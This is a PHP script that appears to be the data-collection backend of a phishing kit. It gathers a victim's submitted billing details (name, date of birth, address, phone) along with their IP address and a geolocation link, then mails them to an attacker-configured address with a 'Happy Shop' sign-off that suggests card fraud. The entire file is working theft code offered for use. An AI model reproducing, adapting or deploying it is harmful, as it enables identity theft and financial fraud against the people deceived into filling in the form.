<?php
  $name = $_POST['billing_name'];
  $birth = $_POST['billing_birth'];
  $address = $_POST['billing_address'];
  $zip = $_POST['billing_zip'];
  $city = $_POST['billing_city'];
  $town = $_POST['billing_town'];
  $state = $_POST['billing_state'];
  $phone = $_POST['billing_phone'];
  $iswrong = $_POST['iswrong'];
  $ip_addresse = getenv('HTTP_CLIENT_IP')?:
  getenv('HTTP_X_FORWARDED_FOR')?:
  getenv('HTTP_X_FORWARDED')?:
  getenv('HTTP_FORWARDED_FOR')?:
  getenv('HTTP_FORWARDED')?:
  getenv('REMOTE_ADDR');
  $subject = "BILLING INFO - FROM ". $ip_addresse ."  -";
  $headers = "From: NARISSI \r\n";
  $headers .= "Reply-To: no-reply \r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
  $msg = "<div style='text-align: center; width: 400px'>";
  $msg .= "----------------------   BILLING INFO   ------------------------- <br><br>";
  $msg .= "<b> Full Name : </b> <span style='color: #3498DB;'>$name</span> <br><br>";
  $msg .= "<b> Date of Birth : </b> <span style='color: #3498DB;'>$birth</span> <br><br>";
  $msg .= "<b> Street Address : </b> <span style='color: #FC575E;'>$address</span> <br><br>";
  $msg .= "<b> Zip Code : </b> <span style='color: #FC575E;'>$zip</span> <br><br>";
  $msg .= "<b> City : </b> <span style='color: #FC575E;'>$city</span> <br><br>";
  $msg .= "<b> Town : </b> <span style='color: #FC575E;'>$town</span> <br><br>";
  $msg .= "<b> Country : </b> <span style='color: #FC575E;'>$state</span> <br><br>";
  $msg .= "<b> Phone : </b> <span style='color: #FC575E;'>$phone</span> <br><br>";

  $msg .= "<b> Ip Address : </b> <span style='color: #FC575E;'>$ip_addresse</span> <br><br>";
  $msg .= "<a href='https://geoiptool.com/fr/?ip=$ip_addresse' target='_blank'>https://geoiptool.com/fr/?ip=$ip_addresse</a><br><br>";
  $msg .= "------------------- Good Luck & Happy Shop <3 ------------------------- <br><br>";
  $msg .= "</div>";
  include '../../config.php';
  $to = $result_to;
  mail($to, $subject, $msg, $headers);
?>
